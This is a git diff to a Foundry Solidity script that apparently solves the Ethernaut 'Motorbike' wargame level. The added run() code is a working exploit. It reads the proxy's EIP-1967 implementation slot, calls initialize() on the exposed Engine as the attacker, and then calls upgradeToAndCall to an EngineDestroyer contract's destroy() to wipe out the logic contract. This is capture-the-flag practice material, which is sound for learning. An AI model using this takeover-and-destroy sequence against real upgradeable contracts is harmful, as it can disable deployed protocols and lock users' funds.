@@ -4,6 +4,7 @@ pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?
 import "forge-std/Script.sol";
 import "forge-std/console2.sol";
 import "src/Motorbike/Motorbike.sol";
+import "./EngineDestroyer.sol";
 
 contract MotorbikeScript is Script {
 
@@ -21,7 +22,7 @@ contract MotorbikeScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Motorbike(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Motorbike(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -33,7 +34,8 @@ contract MotorbikeScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new Motorbike();
+            Engine engine = new Engine();
+            target = new Motorbike(address(engine));
             vm.stopBroadcast();
         }
     }
@@ -45,5 +47,16 @@ contract MotorbikeScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+        bytes32 implementationSlot = vm.load(address(target), bytes32(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
+        address engineAddress = address(uint160(uint256(implementationSlot)));
+        console.log("engine : %s", engineAddress);
+        Engine engine = Engine(engineAddress);
+
+        console.log("[Exploit]");
+        vm.startBroadcast(attacker);
+        engine.initialize();
+        EngineDestroyer destroyer = new EngineDestroyer();
+        engine.upgradeToAndCall(address(destroyer), abi.encodeWithSignature("destroy()"));
+        vm.stopBroadcast();
     }
 }
